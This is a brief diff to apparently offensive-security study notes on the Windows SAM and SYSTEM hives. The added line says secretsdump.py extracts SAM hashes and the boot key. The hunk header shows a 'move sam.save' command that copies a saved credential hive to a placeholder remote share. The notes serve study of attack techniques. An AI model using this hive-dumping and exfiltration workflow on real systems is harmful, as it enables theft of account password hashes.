@@ -25,6 +25,7 @@ move sam.save \\<hoost ip>\SHARENAME
 		-> RIDs(relative identifiers) mapping users to SIDs
 		-> Acc attributes: disabled, locked, password-not-required, etc 
 		-> The keys are encrypted with a boot key from THE `SYSTEM` HIVE
+		-> `secretsdump.py` dumps SAM hashes as well as data\boot key from `SYSTEM` 
 
 	- `C:\Windows\System32\config\SYSTEM`
 	- `C:\Windows\System32\config\SECURITY `
